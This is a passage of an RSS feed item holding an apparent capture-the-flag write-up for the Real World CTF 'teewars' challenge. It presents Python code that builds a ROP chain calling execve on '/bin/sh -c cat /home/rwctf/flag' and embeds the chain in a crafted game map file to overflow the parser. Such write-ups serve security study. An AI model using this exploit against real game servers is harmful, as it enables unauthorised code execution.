+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;argv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cat /home/rwctf/flag&amp;#34;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flat_argv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(argv) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# concatenate arguments with terminating null bytes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;argv_start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6c0000&lt;/span&gt;                   &lt;span style=&#34;color:#75715e&#34;&gt;# address inside bss segment&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;argv&lt;/code&gt; is a null-terminated array of string pointers, each containing one argument. So let&amp;rsquo;s calculate the positions of the individual arguments.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# write pointer&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;content_start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; argv_start &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (len(argv)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;qwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(argv)):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# calculate address&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    qwords&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(p64(content_start &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; offset))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# adjust offset&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    offset &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; len(argv[i]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# append terminating null pointer&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;qwords&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Since the code for moving 8 bytes to bss does not discriminate between pointers and strings, we can also add the content of &lt;code&gt;argv&lt;/code&gt; in 8 byte chunks to the list before writing it to the bss segment. Since &lt;code&gt;argv&lt;/code&gt; does not need to have a length divisible by 8, we have to ensure this by padding with null bytes.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# add content of argv&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; pos &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, len(flat_argv)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    qwords&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(flat_argv[pos:pos&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))  &lt;span style=&#34;color:#75715e&#34;&gt;# ensure 8 bytes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we can write the prepared &lt;code&gt;argv&lt;/code&gt; to it&amp;rsquo;s destination.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;destination &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; argv_start
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; qword &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; qwords:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# pop destination to rdi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rdi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(destination)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# pop content to rax&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; qword
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# move content to destination&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x45f135&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# mov qword ptr [rdi], rax; ret&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# advance destination&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    destination &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, we have to execute the syscall.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# do syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rdi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(content_start)     &lt;span style=&#34;color:#75715e&#34;&gt;# argv[0]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rsi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(argv_start)        &lt;span style=&#34;color:#75715e&#34;&gt;# argv&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rdx&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)                 &lt;span style=&#34;color:#75715e&#34;&gt;# env&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;)                &lt;span style=&#34;color:#75715e&#34;&gt;# execve&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;syscall&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After building the ROP chain, we have to integrate it into the prepared map file. From looking at the pattern data in ImHex, we can spot the relevant parts of the map file that need to be adjusted for the exploit. The number of channels can be found at 0x24c and the overflowable point&amp;rsquo;s values start at 0x750.
+&lt;img src=&#34;/img/realworldctf5-teewars-positions.png&#34; alt=&#34;Screenshot of the pattern data in ImHex&#34;&gt;&lt;/p&gt;
+&lt;p&gt;With this information, we can finalize the script by building the exploit map.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# read prepared map from file&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maps/prepared.map&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    map_content &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# write with changed parts to file&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maps/exploit.map&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wb&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# copy start of file&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(map_content[:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x24c&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# adjust number of channels&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(p32((len(rop_chain) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# copy items until start of overflow&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(map_content[&lt;span style=&#34;color:#ae81ff&#34;&gt;0x250&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x750&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# overflow with ROP chain&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(rop_chain)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# copy remaining map content&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(map_content[&lt;span style=&#34;color:#ae81ff&#34;&gt;0x750&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;len(rop_chain):])
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;flag&#34;&gt;Flag&lt;/h1&gt;
+&lt;p&gt;After hosting the exploit map on our VM and supplying it&amp;rsquo;s IP address to the service, we got the flag: &lt;code&gt;rwctf{Newb1e_1ear1ng_Game_Map}&lt;/code&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
